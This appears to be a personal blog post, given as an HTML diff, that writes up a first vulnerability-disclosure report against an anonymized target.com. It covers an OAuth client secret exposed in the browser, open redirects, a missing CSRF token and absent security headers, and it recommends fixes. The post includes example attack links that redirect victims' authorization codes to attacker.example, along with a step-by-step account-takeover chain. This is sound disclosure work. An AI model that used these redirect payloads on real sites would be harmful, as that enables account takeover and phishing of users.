@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' https: data:; font-src 'self'; connect-src 'self'; manifest-src 'self'; base-uri 'none'; form-action 'none'; object-src 'none'" />
+  <meta name="referrer" content="no-referrer" />
+  <title>The First VDP · ich4k</title>
+  <meta name="description" content="My first report through a VDP. An exposed OAuth secret and an open redirect that chain into account takeover." />
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../../assets/style.css" />
+  <script src="../../assets/theme.js"></script>
+</head>
+<body>
+  <header class="site">
+    <nav class="nav">
+      <a class="brand" href="../../index.html"><span class="dot"></span>ich4k</a>
+      <a class="link" href="../../index.html">Blog</a>
+      <a class="link" href="../../about.html">About</a>
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">☾</button>
+    </nav>
+  </header>
+
+  <main class="wrap">
+    <article>
+      <div class="post-meta">Last updated Nov 19, 2026</div>
+      <h1>The First VDP</h1>
+      <h2>What is a VDP</h2>
+<p>VDP stands for Vulnerability Disclosure Program. It is a public promise from a
+company that says: if you find a security problem in our systems and report it
+to us the right way, we will listen and we will not take legal action against
+you. Unlike a bug bounty there is usually no money involved. You report, they
+fix, everyone is safer.</p>
+<p>This post is about my first report through one. It got triaged, so I am writing
+it down. All names, domains and identifiers are anonymized. The target is called
+target.com and its login service is auth.target.com.</p>
+<h2>The short version</h2>
+<p>The login flow of the main site put its OAuth client secret in client side
+JavaScript and sent it in the URL to the authentication service. On top of
+that, the two parameters that decide where a user lands after logging in were
+read straight from the URL with no validation at all. Put together, an attacker
+could send a victim a real login link and receive the victim&#39;s OAuth tokens on
+their own server. That is a full account takeover.</p>
+<p>The login form also had no CSRF token, and neither site sent any security
+headers.</p>
+<h2>Finding 1: the client secret is public</h2>
+<p>Viewing the source of the home page showed an inline script with the OAuth
+client credentials hardcoded in it:</p>
+<div class="code-block"><button class="copy-btn" type="button" aria-label="Copy code">Copy</button><pre><code class="language-js">var authServiceUrl = &#39;https://auth.target.com&#39;;
+var clientId = &#39;REDACTED_CLIENT_ID&#39;;
+var clientSecret = &#39;REDACTED_CLIENT_SECRET&#39;;</code></pre></div>
+<p>A small function then built the login URL by appending both values as query
+parameters:</p>
+<div class="code-block"><button class="copy-btn" type="button" aria-label="Copy code">Copy</button><pre><code class="language-text">https://auth.target.com/oauth/ui/login?clientId=REDACTED_CLIENT_ID&amp;clientSecret=REDACTED_CLIENT_SECRET&amp;lang=en</code></pre></div>
+<p>The login page itself repeated them as hidden form fields:</p>
+<div class="code-block"><button class="copy-btn" type="button" aria-label="Copy code">Copy</button><pre><code class="language-html">&lt;input name=&quot;OAuthClientId&quot; type=&quot;hidden&quot; value=&quot;REDACTED_CLIENT_ID&quot;&gt;
+&lt;input name=&quot;OAuthClientSecret&quot; type=&quot;hidden&quot; value=&quot;REDACTED_CLIENT_SECRET&quot;&gt;</code></pre></div>
+<p>A client secret is supposed to stay on the server. Once it is in the browser,
+anyone can act as the application towards the auth service.</p>
+<h2>Finding 2: an open redirect in the OAuth flow</h2>
+<p>The same script decided where to send the user after login. It read
+<code>redirectUri</code> from the address bar and used it as is:</p>
+<div class="code-block"><button class="copy-btn" type="button" aria-label="Copy code">Copy</button><pre><code class="language-js">var redirectUri = getQueryParam(&#39;redirectUri&#39;);
+var effectiveRedirectUri = redirectUri || encodeURIComponent(postAuthRedirectUrl);</code></pre></div>
+<p>So this link was enough:</p>
+<div class="code-block"><button class="copy-btn" type="button" aria-label="Copy code">Copy</button><pre><code class="language-text">https://www.target.com/en/member/login/?redirectUri=https://attacker.example/steal</code></pre></div>
+<p>The victim sees the real login page and logs in with their real password. The
+auth service then sends them, together with the OAuth authorization code, to
+attacker.example. The attacker uses that code to get into the account.</p>
+<p>A second parameter, <code>goto</code>, had the same problem:</p>
+<div class="code-block"><button class="copy-btn" type="button" aria-label="Copy code">Copy</button><pre><code class="language-js">var gotoParam = getQueryParam(&#39;goto&#39;);
+var effectiveRedirect = gotoParam || modelRedirectUrl;
+var postAuthRedirectUrl = postAuthRedirectBase;
+if (effectiveRedirect) {
+    postAuthRedirectUrl += &#39;?goto=&#39; + encodeURIComponent(effectiveRedirect);
+}</code></pre></div>
+<div class="code-block"><button class="copy-btn" type="button" aria-label="Copy code">Copy</button><pre><code class="language-text">https://www.target.com/en/member/login/?goto=https://attacker.example/phish</code></pre></div>
+<p>After login the user is bounced through the site&#39;s own redirect endpoint and
+lands on the attacker&#39;s page, which makes for a very convincing phishing link.</p>
+<h2>Finding 3: no CSRF token on the login form</h2>
+<p>The login form on auth.target.com had only four fields: the client id, the
+client secret, the username and the password. No anti CSRF token.</p>
+<p>That allows login CSRF. An attacker hosts a page that silently submits the form
+with the attacker&#39;s own credentials, so the victim ends up logged in to the
+attacker&#39;s account. Anything the victim then saves, like personal details or
+payment information, lands in an account the attacker controls.</p>
+<h2>Finding 4: no security headers</h2>
+<p>Neither the main site nor the auth service sent any of the usual protection
+headers. No Strict-Transport-Security, X-Frame-Options, Content-Security-Policy,
+X-Content-Type-Options, Referrer-Policy or Permissions-Policy. The responses
+only carried caching headers.</p>
+<p>Two things follow from that:</p>
+<ul>
+<li><strong>Clickjacking.</strong> The login page can be framed on another site and the user
+tricked into typing or clicking inside it.</li>
+<li><strong>The secret leaks through the Referer header.</strong> With no Referrer-Policy and
+the secret sitting in the URL, every third party resource the page loads can
+receive it.</li>
+</ul>
+<h2>Impact</h2>
+<p>The serious part is the chain of findings 1 and 2:</p>
+<ol>
+<li>The attacker builds a login link with a <code>redirectUri</code> pointing to their server.</li>
+<li>The victim opens it and sees the genuine login page.</li>
+<li>The victim logs in with their real credentials.</li>
+<li>The auth service sends the authorization code to the attacker.</li>
+<li>The attacker uses it to take over the account, with access to personal data,
+bookings, loyalty points and saved payment methods.</li>
+</ol>
+<h2>What should be fixed</h2>
+<ul>
+<li>Keep the client secret on the server. A browser based login should use the
+authorization code flow with PKCE, which needs no secret in the client.</li>
+<li>Validate <code>redirectUri</code> and <code>goto</code> against a strict allowlist of the site&#39;s own
+URLs, on the server.</li>
+<li>Add an anti CSRF token to the login form.</li>
+<li>Send the standard security headers, at least HSTS, a CSP with
+<code>frame-ancestors</code>, and a Referrer-Policy.</li>
+</ul>
+<h2>What I took from it</h2>
+<p>None of this needed special tools. It was all in the page source and the
+network tab. Reading the JavaScript a site ships to your own browser is still
+one of the best places to start.</p>
+
+      <a class="back" href="../../index.html">← All posts</a>
+    </article>
+  </main>
+
+  <footer class="site">
+    <div class="wrap">
+      <span>© 2026 ich4k</span>
+      <a href="https://github.com/1ch4k" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </footer>
+
+  <script src="../../assets/app.js"></script>
+</body>
+</html>
